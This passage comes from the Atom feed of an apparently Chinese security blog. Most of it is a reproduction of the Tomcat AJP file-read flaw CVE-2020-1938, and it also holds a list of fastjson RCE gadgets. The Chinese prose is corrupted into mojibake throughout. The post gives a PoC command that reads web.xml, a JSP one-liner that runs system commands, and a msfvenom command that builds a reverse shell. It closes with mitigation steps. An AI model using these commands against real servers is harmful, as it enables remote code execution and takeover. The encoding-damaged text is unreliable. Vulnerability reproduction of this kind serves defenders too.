RCEï¼Œéœ€è¦å¼€å¯AutoType</li><li>com.threedr3am.bug.fastjson.CommonsProxyPoc(SessionBeanProvider) åˆ©ç”¨æ¡ä»¶ï¼šfastjson &lt;= 1.2.61 RCEï¼Œéœ€è¦å¼€å¯AutoType</li><li>cas-4.1.x~4.1.6 ååºåˆ—åŒ–æ¼æ´ï¼ˆåˆ©ç”¨é»˜è®¤å¯†é’¥ï¼‰</li><li>cas-4.1.7~4.2.x ååºåˆ—åŒ–æ¼æ´ï¼ˆéœ€è¦çŸ¥é“åŠ å¯†keyå’Œç­¾åkeyï¼‰</li></ol><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://github.com/JoyChou93/java-sec-code/wiki" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki</a><br><a href="http://www.jianfensec.com/70.html" target="_blank" rel="noopener">http://www.jianfensec.com/70.html</a><br><a href="https://www.cnblogs.com/tr1ple/p/12348886.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/12348886.html</a><br>[^2]: <a href="https://www.cnblogs.com/isme-zjh/p/11506495.html" target="_blank" rel="noopener">https://www.cnblogs.com/isme-zjh/p/11506495.html</a><br><a href="https://github.com/jas502n/CVE-2020-8840" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2020-8840</a><br><a href="https://github.com/fairyming/CVE-2020-8840" target="_blank" rel="noopener">https://github.com/fairyming/CVE-2020-8840</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;è¯»è€…å—ä¼—ï¼šæ‰€æœ‰äºº&lt;/li&gt;
&lt;li&gt;é˜…è¯»è¦æ±‚ï¼š30mins&lt;/li&gt;
&lt;li&gt;æ–‡ç« ä¸­2620è¿˜æ²¡å†™å®Œï¼Œæ¸…æ°´å·å´å¤§ä½¬å°±çˆ†2634äº†
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="JavaRCE" scheme="https://summersec.github.io/tags/JavaRCE/"/>
    
  </entry>
  
  <entry>
    <title>CNVD-2020-10487(CVE-2020-1938)tomcat ajp æ–‡ä»¶è¯»å–æ¼æ´</title>
    <link href="https://summersec.github.io/2020/02/23/CNVD-2020-10487(CVE-2020-1938)tomcat%20ajp%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://summersec.github.io/2020/02/23/CNVD-2020-10487(CVE-2020-1938)tomcat%20ajp%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-02-23T11:01:42.000Z</published>
    <updated>2020-05-05T13:12:11.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h1><p>&emsp;&emsp; Tomcat æœåŠ¡å™¨æ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æ”¾æºä»£ç çš„Web åº”ç”¨æœåŠ¡å™¨ï¼Œå±äºè½»é‡çº§åº”ç”¨æœåŠ¡å™¨ï¼Œåœ¨ä¸­å°å‹ç³»ç»Ÿå’Œå¹¶å‘è®¿é—®ç”¨æˆ·ä¸æ˜¯å¾ˆå¤šçš„åœºåˆä¸‹è¢«æ™®éä½¿ç”¨ï¼Œæ˜¯å¼€å‘å’Œè°ƒè¯•JSP ç¨‹åºçš„é¦–é€‰ã€‚ç”±äºTomcaté»˜è®¤å¼€å¯çš„AJPæœåŠ¡ï¼ˆ8009ç«¯å£ï¼‰å­˜åœ¨ä¸€å¤„æ–‡ä»¶åŒ…å«ç¼ºé™·ï¼Œæ”»å‡»è€…å¯æ„é€ æ¶æ„çš„è¯·æ±‚åŒ…è¿›è¡Œæ–‡ä»¶åŒ…å«æ“ä½œï¼Œè¿›è€Œè¯»å–å—å½±å“TomcatæœåŠ¡å™¨ä¸Šçš„Webç›®å½•æ–‡ä»¶ã€‚</p><hr><h1 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h1><ul><li>Apache Tomcat 6 </li><li>Apache Tomcat 7 &lt; 7.0.100 </li><li>Apache Tomcat 8 &lt; 8.5.51 </li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><hr><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>&emsp;&emsp; ä¹‹å‰ä»£ç å®¡è®¡çš„æ—¶å€™å®‰è£…äº†apache tomcat/9.0.29è¿˜å­˜åœ¨è¿™ä¸ªæ¼æ´ï¼Œæ‰€ä»¥ç´¢æ€§å¤ç°ä¸€ä¸‹æ¼æ´ã€‚è¿™é‡Œç¯å¢ƒæ­å»ºå¾ˆç®€å•ï¼Œå»å®˜æ–¹ç½‘ç«™ä¸‹è½½tomcatä¸‹è½½å®‰è£…å°±å¥½äº†ï¼Œä¸ä¼šéšä¾¿ç™¾åº¦ä¸€ç¯‡æ–‡ç« çœ‹çœ‹ï¼Œç¬”è€…è¿™é‡Œå°±ä¸å¤šè¯´ä»€ä¹ˆäº†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200221193023649.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p><code>python poc.py -p 8009 -f &quot;/WEB-INF/web.xml&quot; 127.0.0.1</code><img src="https://img-blog.csdnimg.cn/20200221193441663.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200221193330182.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h1 id="éªšæ“ä½œ-RCE"><a href="#éªšæ“ä½œ-RCE" class="headerlink" title="éªšæ“ä½œ RCE"></a>éªšæ“ä½œ RCE</h1><p>&emsp;&emsp; åˆ©ç”¨å¤§ä½¬hero0ä¿®æ”¹pocè„šæœ¬ï¼Œä¿®æ”¹æˆäº†python3ç‰ˆæœ¬ã€‚<br>å¢åŠ äº† â€“rceé€‰é¡¹ï¼Œä¼šä½¿ç”¨jspæ¸²æŸ“æ‰§è¡Œæ–‡æœ¬ä¸­åŒ…å«çš„å‘½ä»¤ï¼Œé»˜è®¤è¯»å–æ–‡ä»¶æ¨¡å¼ã€‚<br>å¯ä»¥é…åˆä¸Šä¼ æ¼æ´è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚<br>å‘½ä»¤æ‰§è¡Œä¸€å¥è¯:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200221200551291.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200221195146769.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>åˆ©ç”¨msfåå¼¹shell</strong>ï¼ˆä¹Ÿæ˜¯éœ€è¦é…åˆä¸Šä¼ æ¼æ´ï¼‰<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 &gt; shell.txt</code><br><img src="https://img-blog.csdnimg.cn/20200221202102945.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200221195022259.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h1 id="æ¼æ´é˜²æŠ¤"><a href="#æ¼æ´é˜²æŠ¤" class="headerlink" title="æ¼æ´é˜²æŠ¤"></a>æ¼æ´é˜²æŠ¤</h1><p>å¦‚æœç›¸å…³ç”¨æˆ·æš‚æ—¶æ— æ³•è¿›è¡Œç‰ˆæœ¬å‡çº§ï¼Œå¯æ ¹æ®è‡ªèº«æƒ…å†µé‡‡ç”¨ä¸‹åˆ—é˜²æŠ¤æªæ–½ã€‚</p><p>ä¸€ã€è‹¥ä¸éœ€è¦ä½¿ç”¨Tomcat AJPåè®®ï¼Œå¯ç›´æ¥å…³é—­AJP Connectorï¼Œæˆ–å°†å…¶ç›‘å¬åœ°å€æ”¹ä¸ºä»…ç›‘å¬æœ¬æœºlocalhostã€‚</p><p>å…·ä½“æ“ä½œï¼š</p><p>ï¼ˆ1ï¼‰ç¼–è¾‘ <CATALINA_BASE>/conf/server.xmlï¼Œæ‰¾åˆ°å¦‚ä¸‹è¡Œï¼ˆ<CATALINA_BASE> ä¸º Tomcat çš„å·¥ä½œç›®å½•ï¼‰ï¼š</CATALINA_BASE></CATALINA_BASE></p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;</code><br>ï¼ˆ2ï¼‰å°†æ­¤è¡Œæ³¨é‡Šæ‰ï¼ˆä¹Ÿå¯åˆ æ‰è¯¥è¡Œï¼‰ï¼š</p><p><code>&lt;!--&lt;Connectorport=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;--&gt;</code></p><p>ï¼ˆ3ï¼‰ä¿å­˜åéœ€é‡æ–°å¯åŠ¨Tomcatï¼Œè§„åˆ™æ–¹å¯ç”Ÿæ•ˆã€‚</p><p>äºŒã€è‹¥éœ€ä½¿ç”¨Tomcat AJPåè®®ï¼Œå¯æ ¹æ®ä½¿ç”¨ç‰ˆæœ¬é…ç½®åè®®å±æ€§è®¾ç½®è®¤è¯å‡­è¯ã€‚</p><p>ä½¿ç”¨Tomcat 7å’ŒTomcat 9çš„ç”¨æˆ·å¯ä¸ºAJP Connectoré…ç½®secretæ¥è®¾ç½®AJPåè®®çš„è®¤è¯å‡­è¯ã€‚ä¾‹å¦‚ï¼ˆæ³¨æ„å¿…é¡»å°†YOUR_TOMCAT_AJP_SECRETæ›´æ”¹ä¸ºä¸€ä¸ªå®‰å…¨æ€§é«˜ã€æ— æ³•è¢«è½»æ˜“çŒœè§£çš„å€¼ï¼‰ï¼š</p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot;/&gt;</code></p><p>ä½¿ç”¨Tomcat 8çš„ç”¨æˆ·å¯ä¸ºAJP Connectoré…ç½®requiredSecretæ¥è®¾ç½®AJPåè®®çš„è®¤è¯å‡­è¯ã€‚ä¾‹å¦‚ï¼ˆæ³¨æ„å¿…é¡»å°†YOUR_TOMCAT_AJP_SECRETæ›´æ”¹ä¸ºä¸€ä¸ªå®‰å…¨æ€§é«˜ã€æ— æ³•è¢«è½»æ˜“çŒœè§£çš„å€¼ï¼‰ï¼š</p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot;requiredSecret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt;</code></p><hr><h1 id="æ–‡ä»¶èµ„æ–™ä¸‹è½½"><a href="#æ–‡ä»¶èµ„æ–™ä¸‹è½½" class="headerlink" title="æ–‡ä»¶èµ„æ–™ä¸‹è½½"></a>æ–‡ä»¶èµ„æ–™ä¸‹è½½</h1><p>æ–‡ä¸­æ‰€ä»¥èµ„æ–™éƒ½åœ¨è¿™é‡Œã€‚<br>é“¾æ¥: <a href="https://pan.baidu.com/s/101wFmK1J0OGYRC383fdBBA" target="_blank" rel="noopener">https://pan.baidu.com/s/101wFmK1J0OGYRC383fdBBA</a> æå–ç : xg4s</p><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.t00ls.net/thread-55061-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-55061-1-1.html</a><br><a href="https://www.t00ls.net/viewthread.php?tid=55062&amp;extra=&amp;page=1" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=55062&amp;extra=&amp;page=1</a><br><a href="https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC" target="_blank" rel="noopener">https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC</a>**</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;æ¼æ´ç®€ä»‹&quot;&gt;&lt;a href=&quot;#æ¼æ´ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´ç®€ä»‹&quot;&gt;&lt;/a&gt;æ¼æ´ç®€ä»‹&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Tomcat æœåŠ¡å™¨æ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æ”¾æºä»£ç çš„Web åº”ç”¨æœåŠ¡å™¨ï¼Œå±äºè½»é‡çº§åº”ç”¨æœåŠ¡å™¨ï¼Œåœ¨ä¸­å°å‹ç³»ç»Ÿ
      
    
    </summary>
    
    
      <category term="æ€»ç»“" scheme="https://summersec.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="æ¼æ´å¤ç°" scheme="https://summersec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
</feed>
